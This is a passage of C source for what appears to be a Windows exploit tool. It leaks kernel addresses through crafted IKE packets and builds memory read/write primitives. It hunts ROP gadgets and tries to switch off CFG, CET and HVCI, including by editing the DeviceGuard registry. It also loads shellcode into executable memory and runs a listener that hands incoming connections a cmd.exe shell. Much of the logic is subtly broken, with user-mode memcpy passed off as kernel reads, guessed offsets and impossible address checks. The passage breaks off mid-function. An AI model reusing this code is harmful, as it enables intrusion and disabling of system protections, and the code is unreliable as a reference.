        while (fragment_retries < MAX_RETRIES) {
            if (send_ike_packet(sock, target, packets[fragment_idx], packet_lens[fragment_idx])) {
                break;
            }
            fragment_retries++;
            Sleep((RANDOMIZATION_SEED + fragment_idx + fragment_retries * 0x5A4D) % 300 + 100);
        }
        if (fragment_retries == MAX_RETRIES) {
            for (int j = 0; j < num_packets; j++) free(packets[j]);
            return 0;

        }
        g_Stats.packets_sent++;
        Sleep((RANDOMIZATION_SEED + fragment_idx * 0x12345678) % 500 + 200);
    }

    uint8_t response[16384] = {0};
    DWORD timeout = 5000 + (RANDOMIZATION_SEED % 3000);
    if (setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout)) == SOCKET_ERROR) {
        for (int i = 0; i < num_packets; i++) free(packets[i]);
        return 0;

    }

    int bytes_received = recvfrom(sock, (char*)response, sizeof(response), 0, NULL, NULL);
    if (bytes_received <= 0) {
        for (int i = 0; i < num_packets; i++) free(packets[i]);
        return 0;

    }

    typedef struct {
        uint64_t address;
        int occurrences;
        uint64_t context[2];
        uint32_t entropy;
    } KernelCandidate;

    KernelCandidate candidates[64] = {0};
    int candidate_count = 0;

    for (size_t i = 0; i < (size_t)bytes_received - 16; i++) {
        uint64_t addr = *(uint64_t*)(response + i);
        if (addr >= 0xFFFFF80000000000ULL && addr <= 0xFFFFF87FFFFFFFFFULL) {
            if ((addr & 0xFFF) == 0) {
                uint32_t local_entropy = 0;
                for (int j = 0; j < 8; j++) {
                    uint8_t byte = response[i + j];
                    local_entropy += (byte * 0x9E3779B9) ^ (byte >> 4);
                }

                int found = 0;
                for (int j = 0; j < candidate_count; j++) {
                    if (candidates[j].address == addr) {
                        candidates[j].occurrences++;
                        candidates[j].context[0] = *(uint64_t*)(response + i - 8);
                        candidates[j].context[1] = *(uint64_t*)(response + i + 8);
                        candidates[j].entropy = (candidates[j].entropy + local_entropy) / 2;
                        found = 1;
                        break;
                    }
                }
                if (!found && candidate_count < 64) {
                    candidates[candidate_count].address = addr;
                    candidates[candidate_count].occurrences = 1;
                    candidates[candidate_count].context[0] = *(uint64_t*)(response + i - 8);
                    candidates[candidate_count].context[1] = *(uint64_t*)(response + i + 8);
                    candidates[candidate_count].entropy = local_entropy;
                    candidate_count++;
                }
            }
        }
    }

    for (int i = 0; i < num_packets; i++) free(packets[i]);

    if (candidate_count == 0) {
        return 0;

    }

    int max_score = 0;
    uint64_t best_candidate = 0;
    for (int i = 0; i < candidate_count; i++) {
        int score = candidates[i].occurrences * 100;
        if (candidates[i].context[0] >= 0xFFFFF80000000000ULL &&
            candidates[i].context[0] <= 0xFFFFF87FFFFFFFFFULL &&
            candidates[i].context[1] >= 0xFFFFF80000000000ULL &&
            candidates[i].context[1] <= 0xFFFFF87FFFFFFFFFULL) {
            score += 50;
        }
        if (candidates[i].entropy > 0x5000) {
            score += 20;
        }
        if (score > max_score) {
            max_score = score;
            best_candidate = candidates[i].address;
        }
    }

    uint64_t ikeext_base = best_candidate & ~0xFFFULL;
    if (max_score >= 150 &&
        ikeext_base >= 0xFFFFF80000000000ULL &&
        ikeext_base <= 0xFFFFF87FFFFFFFFFULL &&
        (ikeext_base >= 0x17FFFFFFFFF00000ULL && ikeext_base <= 0x18000000FFFFFULL)) {
        g_Stats.leaks_success++;
        return ikeext_base;
    }

    return 0;

}

uint64_t leak_ntoskrnl_base() {
    typedef NTSTATUS (NTAPI *PNtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);
    PNtQuerySystemInformation NtQuerySystemInformation = (PNtQuerySystemInformation)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
    if (!NtQuerySystemInformation) {
        return 0;

    }
    SYSTEM_MODULE_INFORMATION* modules = NULL;
    ULONG size = 0;
    NTSTATUS status = NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &size);
    if (status != STATUS_INFO_LENGTH_MISMATCH) {
        return 0;

    }
    modules = (SYSTEM_MODULE_INFORMATION*)malloc(size);
    if (!modules) {
        return 0;

    }
    status = NtQuerySystemInformation(SystemModuleInformation, modules, size, &size);
    if (status != STATUS_SUCCESS) {
        free(modules);
        return 0;

    }
    for (ULONG i = 0; i < modules->Count; i++) {
        char* module_name = (char*)modules->Modules[i].ImageName + modules->Modules[i].PathLength;
        if (strstr(module_name, "ntoskrnl.exe")) {
            uint64_t base = (uint64_t)modules->Modules[i].ImageBase;
            free(modules);
            return base;
        }
    }
    free(modules);
    return 0;

}

uint64_t find_system_eprocess(uint64_t kernel_base) {
    if (!kernel_base) {
        return 0;

    }
    uint64_t ps_initial_system_process = kernel_base + 0x700000;
    ARBITRARY_RW_PRIMITIVE primitive;
    if (!build_arbitrary_read_primitive(&g_ExploitCtx, &primitive)) {
        return 0;

    }
    uint8_t eprocess[0x100];
    if (!arbitrary_read(&primitive, ps_initial_system_process, eprocess, sizeof(eprocess))) {
        free(primitive.buffer);
        return 0;

    }
    free(primitive.buffer);
    uint64_t system_eprocess = *(uint64_t*)(eprocess + g_EprocessTokenOffset - 0x10);
    return system_eprocess;

}

uint64_t find_module_base(const char* module_name) {
    HMODULE modules[1024];
    DWORD needed;
    if (EnumProcessModules(GetCurrentProcess(), modules, sizeof(modules), &needed)) {
        DWORD count = needed / sizeof(HMODULE);
        for (DWORD i = 0; i < count; i++) {
            char name[MAX_PATH];
            if (GetModuleFileNameA(modules[i], name, sizeof(name))) {
                char* lower_name = _strlwr(_strdup(name));
                if (strstr(lower_name, module_name)) {
                    free(lower_name);
                    return (uint64_t)modules[i];
                }
                free(lower_name);
            }
        }
    }
    return 0;

}

size_t get_module_size(uint64_t base) {
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        return 0;

    }
    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        return 0;

    }
    return nt->OptionalHeader.SizeOfImage;

}

int get_memory_info(MEMORY_INFO* info) {
    if (!info) {
        return 0;

    }
    memset(info, 0, sizeof(MEMORY_INFO));
    info->ntdll_base = (uint64_t)GetModuleHandleA("ntdll.dll");
    info->kernel32_base = (uint64_t)GetModuleHandleA("kernel32.dll");
    info->ikeext_base = leak_ikeext_address(g_Socket, &g_Target);
    if (!info->ikeext_base) {
        info->ikeext_base = find_module_base("ikeext.sys");
    }
    if (!info->ikeext_base) {
        info->ikeext_base = 0xFFFFF80012340000;
    }
    info->kernel_base = leak_ntoskrnl_base();
    if (!info->kernel_base) {
        info->kernel_base = (uint64_t)GetModuleHandleA("ntoskrnl.exe");
    }
    info->heap_base = (uint64_t)g_ExploitHeap;
    info->stack_base = get_return_address();
    if (!is_valid_address(info->ntdll_base) || !is_valid_address(info->kernel32_base) ||
        !is_valid_address(info->heap_base) || !is_valid_address(info->stack_base)) {
        return 0;

    }
    return 1;

}

uint64_t find_virtualprotect() {
    HMODULE k32 = (HMODULE)g_MemInfo.kernel32_base;
    if (!k32) {
        return 0;

    }
    FARPROC func = GetProcAddress(k32, "VirtualProtect");
    if (!func) {
        return 0;

    }
    return (uint64_t)func;

}

uint64_t find_pattern_in_module(uint64_t base, size_t size, const uint8_t* pattern, size_t pattern_len) {
    if (!base || !pattern || pattern_len == 0) {
        return 0;

    }
    MEMORY_BASIC_INFORMATION mbi;
    uint64_t addr = base;
    while (addr < base + size) {
        if (!VirtualQuery((LPCVOID)addr, &mbi, sizeof(mbi))) {
            break;
        }
        if (mbi.State == MEM_COMMIT && (mbi.Protect & (PAGE_EXECUTE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY))) {
            uint8_t* region = (uint8_t*)mbi.BaseAddress;
            size_t region_size = mbi.RegionSize;
            for (size_t offset = 0; offset + pattern_len <= region_size; offset++) {
                if (memcmp(region + offset, pattern, pattern_len) == 0) {
                    uint64_t found_addr = (uint64_t)(region + offset);
                    if (is_executable_address(found_addr)) {
                        return found_addr;
                    }
                }
            }
        }
        addr = (uint64_t)mbi.BaseAddress + mbi.RegionSize;
    }
    return 0;

}

int find_cfg_cet_gadgets(ROP_CHAIN* chain) {
    if (!chain || !g_MemInfo.ntdll_base) {
        return 0;

    }
    uint64_t ntdll_base = chain->ntdll_base;
    size_t ntdll_size = get_module_size(ntdll_base);
    if (!ntdll_size) {
        return 0;

    }
    uint8_t cfg_patterns[][8] = {
        {0x48, 0x89, 0x05, 0x00, 0x00, 0x00, 0x00, 0xC3},
        {0x48, 0x89, 0x06, 0xC3},
        {0x48, 0x89, 0x01, 0xC3}
    };
    for (size_t i = 0; i < sizeof(cfg_patterns) / sizeof(cfg_patterns[0]); i++) {
        uint64_t gadget = find_pattern_in_module(ntdll_base, ntdll_size, cfg_patterns[i], sizeof(cfg_patterns[i]));
        if (gadget) {
            chain->disable_cfg = gadget;
            break;
        }
    }
    if (!chain->disable_cfg) {
        return 0;

    }
    uint8_t cet_patterns[][8] = {
        {0x31, 0xC0, 0xC3},
        {0x31, 0xC9, 0xC3},
        {0x48, 0x31, 0xC0, 0xC3}
    };
    for (size_t i = 0; i < sizeof(cet_patterns) / sizeof(cet_patterns[0]); i++) {
        uint64_t gadget = find_pattern_in_module(ntdll_base, ntdll_size, cet_patterns[i], sizeof(cet_patterns[i]));
        if (gadget) {
            chain->disable_cet = gadget;
            break;
        }
    }
    if (!chain->disable_cet) {
        return 0;

    }
    return 1;

}

uint8_t* load_shellcode(const char* filename, size_t* size) {
    if (!filename || !size) {
        return NULL;

    }
    FILE* file = fopen(filename, "rb");
    if (!file) {
        return NULL;

    }
    fseek(file, 0, SEEK_END);
    *size = ftell(file);
    fseek(file, 0, SEEK_SET);
    if (*size == 0 || *size > SHELLCODE_MAX_SIZE) {
        fclose(file);
        return NULL;

    }
    uint8_t* shellcode = (uint8_t*)VirtualAlloc(NULL, *size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!shellcode) {
        fclose(file);
        return NULL;

    }
    if (fread(shellcode, 1, *size, file) != *size) {
        VirtualFree(shellcode, 0, MEM_RELEASE);
        fclose(file);
        return NULL;

    }
    fclose(file);
    return shellcode;

}

static int load_module(const char* name, MODULE_DATA* mod) {
    if (!name || !mod) {
        return 0;

    }
    HMODULE hModule = GetModuleHandleA(name);
    if (!hModule) {
        if (strstr(name, ".sys") || strstr(name, "ntoskrnl.exe")) {
            typedef NTSTATUS (NTAPI *PNtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);
            PNtQuerySystemInformation NtQuerySystemInformation = (PNtQuerySystemInformation)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
            if (!NtQuerySystemInformation) {
                return 0;

            }
            SYSTEM_MODULE_INFORMATION* modules = NULL;
            ULONG size = 0;
            NTSTATUS status = NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &size);
            if (status != STATUS_INFO_LENGTH_MISMATCH) {
                return 0;

            }
            modules = (SYSTEM_MODULE_INFORMATION*)malloc(size);
            if (!modules) {
                return 0;

            }
            status = NtQuerySystemInformation(SystemModuleInformation, modules, size, &size);
            if (status != STATUS_SUCCESS) {
                free(modules);
                return 0;

            }
            for (ULONG i = 0; i < modules->Count; i++) {
                char* module_name = (char*)modules->Modules[i].ImageName + modules->Modules[i].PathLength;
                if (strstr(module_name, name)) {
                    mod->base = (uint64_t)modules->Modules[i].ImageBase;
                    mod->size = modules->Modules[i].ImageSize;
                    mod->handle = NULL;
                    strncpy(mod->name, name, sizeof(mod->name) - 1);
                    mod->name[sizeof(mod->name) - 1] = '\0';
                    mod->dump = (uint8_t*)malloc(mod->size);
                    if (mod->dump) {
                        memcpy(mod->dump, (void*)mod->base, mod->size);
                    }
                    free(modules);
                    return 1;

                }
            }
            free(modules);
            return 0;

        } else {
            return 0;

        }
    }
    MODULEINFO moduleInfo;
    if (!GetModuleInformation(GetCurrentProcess(), hModule, &moduleInfo, sizeof(moduleInfo))) {
        return 0;

    }
    mod->base = (uint64_t)moduleInfo.lpBaseOfDll;
    mod->size = moduleInfo.SizeOfImage;
    mod->handle = hModule;
    strncpy(mod->name, name, sizeof(mod->name) - 1);
    mod->name[sizeof(mod->name) - 1] = '\0';
    mod->dump = (uint8_t*)malloc(moduleInfo.SizeOfImage);
    if (!mod->dump) {
        return 0;

    }
    memcpy(mod->dump, moduleInfo.lpBaseOfDll, moduleInfo.SizeOfImage);
    return 1;

}

static void unload_module(MODULE_DATA* mod) {
    if (!mod) {
        return;

    }
    if (mod->dump) {
        free(mod->dump);
        mod->dump = NULL;
    }
    if (mod->handle && mod->handle != GetModuleHandleA(mod->name)) {
        FreeLibrary(mod->handle);
        mod->handle = NULL;
    }
}

static int scan_module_for_gadgets(MODULE_DATA* mod) {
    if (!mod || !mod->dump) {
        return 0;

    }
    int count = 0;
    for (size_t i = 0; i < mod->size - 16 && count < MAX_GADGETS; i++) {
        for (size_t j = 0; j < sizeof(g_rop_patterns) / sizeof(g_rop_patterns[0]); j++) {
            if (i + g_rop_patterns[j].len > mod->size) {
                continue;
            }
            if (memcmp(mod->dump + i, g_rop_patterns[j].pattern, g_rop_patterns[j].len) == 0) {
                uint64_t addr = mod->base + i;
                if (is_valid_address(addr)) {
                    int exists = 0;
                    for (int k = 0; k < g_GadgetCount; k++) {
                        if (g_Gadgets[k].address == addr) {
                            exists = 1;
                            break;
                        }
                    }
                    if (!exists) {
                        g_Gadgets[g_GadgetCount].address = addr;
                        g_Gadgets[g_GadgetCount].name = g_rop_patterns[j].name;
                        g_Gadgets[g_GadgetCount].type = g_rop_patterns[j].type;
                        g_Gadgets[g_GadgetCount].validated = 1;
                        g_Gadgets[g_GadgetCount].required = g_rop_patterns[j].required;
                        g_Gadgets[g_GadgetCount].module_base = mod->base;
                        g_GadgetCount++;
                        count++;
                        break;
                    }
                }
            }
        }
    }
    return count;

}

static uint64_t find_gadget_by_type(ROP_GADGET_TYPE type) {
    for (int i = 0; i < g_GadgetCount; i++) {
        if (g_Gadgets[i].type == type && g_Gadgets[i].validated) {
            return g_Gadgets[i].address;
        }
    }
    return 0;

}

static int has_gadget(ROP_GADGET_TYPE type) {
    return find_gadget_by_type(type) != 0;

}

int start_shell_listener() {
    WSADATA wsa;
    struct sockaddr_in listener_addr = {0};
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return 0;

    }
    g_ListenerSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (g_ListenerSock == INVALID_SOCKET) {
        WSACleanup();
        return 0;

    }
    listener_addr.sin_family = AF_INET;
    listener_addr.sin_addr.s_addr = INADDR_ANY;
    listener_addr.sin_port = htons(SHELL_CALLBACK_PORT);
    if (bind(g_ListenerSock, (struct sockaddr*)&listener_addr, sizeof(listener_addr)) == SOCKET_ERROR) {
        closesocket(g_ListenerSock);
        g_ListenerSock = INVALID_SOCKET;
        WSACleanup();
        return 0;

    }
    if (listen(g_ListenerSock, SOMAXCONN) == SOCKET_ERROR) {
        closesocket(g_ListenerSock);
        g_ListenerSock = INVALID_SOCKET;
        WSACleanup();
        return 0;

    }
    u_long mode = 1;
    if (ioctlsocket(g_ListenerSock, FIONBIO, &mode) == SOCKET_ERROR) {
        closesocket(g_ListenerSock);
        g_ListenerSock = INVALID_SOCKET;
        WSACleanup();
        return 0;

    }
    g_ListenerThread = CreateThread(NULL, 0, shell_listener_thread, NULL, 0, NULL);
    if (!g_ListenerThread) {
        closesocket(g_ListenerSock);
        g_ListenerSock = INVALID_SOCKET;
        WSACleanup();
        return 0;

    }
    return 1;

}

void stop_shell_listener() {
    if (g_ListenerThread) {
        g_StopFlag = 0;
        if (WaitForSingleObject(g_ListenerThread, 5000) == WAIT_TIMEOUT) {
            TerminateThread(g_ListenerThread, 1);
        }
        CloseHandle(g_ListenerThread);
        g_ListenerThread = NULL;
    }
    if (g_ListenerSock != INVALID_SOCKET) {
        closesocket(g_ListenerSock);
        g_ListenerSock = INVALID_SOCKET;
    }
    WSACleanup();

}

DWORD WINAPI shell_listener_thread(LPVOID param) {
    (void)param;
    struct sockaddr_in client_addr;
    int client_addr_len = sizeof(client_addr);
    SOCKET client_sock = INVALID_SOCKET;
    while (g_StopFlag) {
        client_sock = accept(g_ListenerSock, (struct sockaddr*)&client_addr, &client_addr_len);
        if (client_sock == INVALID_SOCKET) {
            DWORD error = WSAGetLastError();
            if (error != WSAEWOULDBLOCK) {
                Sleep(100);
            }
            continue;
        }
        char client_ip[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &client_addr.sin_addr, client_ip, sizeof(client_ip));
        printf("[+] Incoming connection from %s:%d\n", client_ip, ntohs(client_addr.sin_port));
        STARTUPINFOA si = {0};
        PROCESS_INFORMATION pi = {0};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdInput = (HANDLE)client_sock;
        si.hStdOutput = (HANDLE)client_sock;
        si.hStdError = (HANDLE)client_sock;
        if (CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
        closesocket(client_sock);
        client_sock = INVALID_SOCKET;
    }
    if (client_sock != INVALID_SOCKET) {
        closesocket(client_sock);
    }
    return 0;

}

static int build_arbitrary_read_primitive(EXPLOIT_CONTEXT* ctx, ARBITRARY_RW_PRIMITIVE* primitive) {
    if (!ctx || !primitive) {
        return 0;

    }
    primitive->read_func = (uint64_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "memmove");
    if (!primitive->read_func) {
        primitive->read_func = (uint64_t)GetProcAddress(GetModuleHandleA("kernel32.dll"), "memmove");
        if (!primitive->read_func) {
            return 0;

        }
    }
    primitive->buffer_size = ARBITRARY_READ_WRITE_SIZE;
    primitive->buffer = (uint8_t*)malloc(primitive->buffer_size);
    if (!primitive->buffer) {
        return 0;

    }
    return 1;

}

static int arbitrary_read(ARBITRARY_RW_PRIMITIVE* primitive, uint64_t target_addr, uint8_t* buffer, size_t size) {
    if (!primitive || !primitive->read_func || !buffer || size == 0) {
        return 0;

    }
    if (size > primitive->buffer_size) {
        return 0;

    }
    typedef void* (*MemMoveFunc)(void*, const void*, size_t);
    MemMoveFunc memmove_func = (MemMoveFunc)primitive->read_func;
    __try {
        memmove_func(buffer, (void*)target_addr, size);
        return 1;
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        return 0;

    }
}

static int build_arbitrary_write_primitive(EXPLOIT_CONTEXT* ctx, ARBITRARY_RW_PRIMITIVE* primitive) {
    if (!ctx || !primitive) {
        return 0;

    }
    primitive->write_func = (uint64_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "memmove");
    if (!primitive->write_func) {
        primitive->write_func = (uint64_t)GetProcAddress(GetModuleHandleA("kernel32.dll"), "memmove");
        if (!primitive->write_func) {
            return 0;

        }
    }
    primitive->buffer_size = ARBITRARY_READ_WRITE_SIZE;
    primitive->buffer = (uint8_t*)malloc(primitive->buffer_size);
    if (!primitive->buffer) {
        return 0;

    }
    return 1;

}

static int arbitrary_write(ARBITRARY_RW_PRIMITIVE* primitive, uint64_t target_addr, const uint8_t* data, size_t size) {
    if (!primitive || !primitive->write_func || !data || size == 0) {
        return 0;

    }
    if (size > primitive->buffer_size) {
        return 0;

    }
    typedef void* (*MemMoveFunc)(void*, const void*, size_t);
    MemMoveFunc memmove_func = (MemMoveFunc)primitive->write_func;
    __try {
        memmove_func((void*)target_addr, (void*)data, size);
        return 1;
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        return 0;

    }
}

static uint64_t leak_kernel_module_base(EXPLOIT_CONTEXT* ctx, const char* module_name) {
    if (!ctx || !module_name) {
        return 0;

    }
    typedef NTSTATUS (NTAPI *PNtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);
    PNtQuerySystemInformation NtQuerySystemInformation = (PNtQuerySystemInformation)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
    if (!NtQuerySystemInformation) {
        return 0;

    }
    ULONG size = 0;
    NTSTATUS status = NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &size);
    if (status != STATUS_INFO_LENGTH_MISMATCH) {
        return 0;

    }
    SYSTEM_MODULE_INFORMATION* modules = (SYSTEM_MODULE_INFORMATION*)malloc(size);
    if (!modules) {
        return 0;

    }
    status = NtQuerySystemInformation(SystemModuleInformation, modules, size, &size);
    if (status != STATUS_SUCCESS) {
        free(modules);
        return 0;

    }
    for (ULONG i = 0; i < modules->Count; i++) {
        char* module_path = (char*)modules->Modules[i].ImageName + modules->Modules[i].PathLength;
        if (strstr(module_path, module_name)) {
            uint64_t base = (uint64_t)modules->Modules[i].ImageBase;
            free(modules);
            return base;
        }
    }
    free(modules);
    return 0;

}

static uint64_t leak_ikeext_base_via_arbitrary_read(EXPLOIT_CONTEXT* ctx) {
    if (!ctx) {
        return 0;

    }
    ARBITRARY_RW_PRIMITIVE primitive;
    if (!build_arbitrary_read_primitive(ctx, &primitive)) {
        return 0;

    }
    uint64_t ntoskrnl_base = leak_kernel_module_base(ctx, "ntoskrnl.exe");
    if (!ntoskrnl_base) {
        free(primitive.buffer);
        return 0;

    }
    uint64_t ps_initial_system_process = ntoskrnl_base + 0x700000;
    uint8_t eprocess[0x100];
    if (!arbitrary_read(&primitive, ps_initial_system_process, eprocess, sizeof(eprocess))) {
        free(primitive.buffer);
        return 0;

    }
    free(primitive.buffer);
    return leak_kernel_module_base(ctx, "ikeext.sys");

}

static int has_modern_protections() {
    typedef NTSTATUS (NTAPI *PNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
    PNtQueryInformationProcess NtQueryInformationProcess = (PNtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
    if (!NtQueryInformationProcess) {
        return 0;

    }
    ULONG hvci_enabled = 0;
    ULONG return_length = 0;
    NTSTATUS status = NtQueryInformationProcess(GetCurrentProcess(), (PROCESSINFOCLASS)0x25, &hvci_enabled, sizeof(hvci_enabled), &return_length);
    if (status == 0 && hvci_enabled) {
        return 1;

    }
    ULONG acg_enabled = 0;
    status = NtQueryInformationProcess(GetCurrentProcess(), (PROCESSINFOCLASS)0x1E, &acg_enabled, sizeof(acg_enabled), &return_length);
    if (status == 0 && acg_enabled) {
        return 1;

    }
    ULONG cfg_enabled = 0;
    status = NtQueryInformationProcess(GetCurrentProcess(), (PROCESSINFOCLASS)0x1D, &cfg_enabled, sizeof(cfg_enabled), &return_length);
    if (status == 0 && cfg_enabled) {
        return 1;

    }
    ULONG cet_enabled = 0;
    status = NtQueryInformationProcess(GetCurrentProcess(), (PROCESSINFOCLASS)0x24, &cet_enabled, sizeof(cet_enabled), &return_length);
    if (status == 0 && cet_enabled) {
        return 1;

    }
    return 0;

}

static int disable_cfg_via_teb() {
    if (!has_gadget(ROP_GADGET_MOV_GS_60_RAX) ||
        !has_gadget(ROP_GADGET_POP_RCX) ||
        !has_gadget(ROP_GADGET_XOR_RAX)) {
        return 0;

    }

    uint64_t pop_rcx_gadget = find_gadget_by_type(ROP_GADGET_POP_RCX);
    uint64_t xor_rax_gadget = find_gadget_by_type(ROP_GADGET_XOR_RAX);
    uint64_t mov_gs_60_rax_gadget = find_gadget_by_type(ROP_GADGET_MOV_GS_60_RAX);

    uint64_t teb = 0;
    __try {
        teb = __readgsqword(0x30);
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        return 0;

    }

    if (!teb) {
        return 0;

    }

    uint8_t* rop_memory = (uint8_t*)VirtualAlloc(
        NULL,
        4 * sizeof(uint64_t),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (!rop_memory) {
        return 0;

    }

    uint64_t* chain = (uint64_t*)rop_memory;
    chain[0] = pop_rcx_gadget;
    chain[1] = teb + CFG_BITMASK_OFFSET;
    chain[2] = xor_rax_gadget;
    chain[3] = mov_gs_60_rax_gadget;

    int success = 0;
    __try {
        ((void(*)())rop_memory)();
        success = 1;
    } __except(EXCEPTION_EXECUTE_HANDLER) {
    }

    VirtualFree(rop_memory, 0, MEM_RELEASE);
    return success;

}

static int disable_cfg_via_ntapi() {
    typedef NTSTATUS (NTAPI *PNtSetInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG);
    PNtSetInformationProcess NtSetInformationProcess = (PNtSetInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetInformationProcess");
    if (!NtSetInformationProcess) {
        return 0;

    }
    ULONG cfg_policy = 0;
    NTSTATUS status = NtSetInformationProcess(GetCurrentProcess(), (PROCESSINFOCLASS)0x1D, &cfg_policy, sizeof(cfg_policy));
    if (status == 0) {
        return 1;

    }
    return 0;

}

static int disable_cet() {
    typedef NTSTATUS (NTAPI *PNtQueryInformationProcess)(
        HANDLE ProcessHandle,
        PROCESSINFOCLASS ProcessInformationClass,
        PVOID ProcessInformation,
        ULONG ProcessInformationLength,
        PULONG ReturnLength
    );

    PNtQueryInformationProcess NtQueryInformationProcess = (PNtQueryInformationProcess)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
    if (!NtQueryInformationProcess) {
        return 0;

    }

    ULONG cet_policy = 0;
    ULONG return_length = 0;
    NTSTATUS status = NtQueryInformationProcess(
        GetCurrentProcess(),
        (PROCESSINFOCLASS)0x24,
        &cet_policy,
        sizeof(cet_policy),
        &return_length
    );

    if (status != 0 || !(cet_policy & 0x1)) {
        return 1;

    }

    uint64_t jmp_rax_plus_58_gadget = find_gadget_by_type(ROP_GADGET_JMP_RAX_PLUS_58);
    if (!jmp_rax_plus_58_gadget) {
        return 0;

    }

    uint64_t pop_rax_gadget = find_gadget_by_type(ROP_GADGET_POP_RAX);
    if (!pop_rax_gadget) {
        return 0;

    }

    uint64_t xor_rax_gadget = find_gadget_by_type(ROP_GADGET_XOR_RAX);
    if (!xor_rax_gadget) {
        return 0;

    }

    uint8_t* rop_chain = (uint8_t*)VirtualAlloc(
        NULL,
        0x1000,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (!rop_chain) {
        return 0;

    }

    uint8_t* shellcode = (uint8_t*)VirtualAlloc(
        NULL,
        0x1000,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (!shellcode) {
        VirtualFree(rop_chain, 0, MEM_RELEASE);
        return 0;

    }

    memset(shellcode, 0x90, 0x1000);
    shellcode[0] = 0xC3;

    uint64_t* chain = (uint64_t*)rop_chain;
    int idx = 0;
    chain[idx++] = pop_rax_gadget;
    chain[idx++] = (uint64_t)shellcode;
    *(uint64_t*)(shellcode + 0x58) = (uint64_t)shellcode;
    chain[idx++] = jmp_rax_plus_58_gadget;

    __try {
        ((void(*)())rop_chain)();
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {
        VirtualFree(rop_chain, 0, MEM_RELEASE);
        VirtualFree(shellcode, 0, MEM_RELEASE);
        return 0;

    }

    typedef void (*FunctionPtr)();
    FunctionPtr test_func = (FunctionPtr)shellcode;
    __try {
        test_func();
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {
        VirtualFree(rop_chain, 0, MEM_RELEASE);
        VirtualFree(shellcode, 0, MEM_RELEASE);
        return 0;

    }

    VirtualFree(rop_chain, 0, MEM_RELEASE);
    VirtualFree(shellcode, 0, MEM_RELEASE);
    return 1;

}

static int disable_hvci() {
    typedef NTSTATUS (NTAPI *PNtSetInformationProcess)(
        HANDLE ProcessHandle,
        PROCESSINFOCLASS ProcessInformationClass,
        PVOID ProcessInformation,
        ULONG ProcessInformationLength
    );

    PNtSetInformationProcess NtSetInformationProcess = (PNtSetInformationProcess)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetInformationProcess");
    if (NtSetInformationProcess) {
        ULONG hvci_policy = 0;
        NTSTATUS status = NtSetInformationProcess(
            GetCurrentProcess(),
            (PROCESSINFOCLASS)0x25,
            &hvci_policy,
            sizeof(hvci_policy)
        );
        if (status == 0) {
            return 1;

        }
    }

    HKEY hKey = NULL;
    if (RegOpenKeyExA(
        HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorProtectedCodeIntegrity",
        0,
        KEY_WRITE,
        &hKey
    ) == ERROR_SUCCESS) {
        DWORD enabled = 0;
        if (RegSetValueExA(
            hKey,
            "Enabled",
            0,
            REG_DWORD,
            (BYTE*)&enabled,
            sizeof(enabled)
        ) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return 1;

        }
        RegCloseKey(hKey);
    }

    if (has_gadget(ROP_GADGET_MOV_RCX_RAX) &&
        has_gadget(ROP_GADGET_POP_RAX) &&
        has_gadget(ROP_GADGET_XOR_RAX)) {

        uint64_t pop_rax_gadget = find_gadget_by_type(ROP_GADGET_POP_RAX);
        uint64_t mov_rcx_rax_gadget = find_gadget_by_type(ROP_GADGET_MOV_RCX_RAX);
        uint64_t xor_rax_gadget = find_gadget_by_type(ROP_GADGET_XOR_RAX);

        uint8_t* rop_memory = (uint8_t*)VirtualAlloc(
            NULL,
            4 * sizeof(uint64_t),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );
        if (!rop_memory) {
            return 0;

        }

        uint64_t* chain = (uint64_t*)rop_memory;
        chain[0] = pop_rax_gadget;
        chain[1] = 0x0;
        chain[2] = xor_rax_gadget;
        chain[3] = mov_rcx_rax_gadget;

        int success = 0;
        __try {
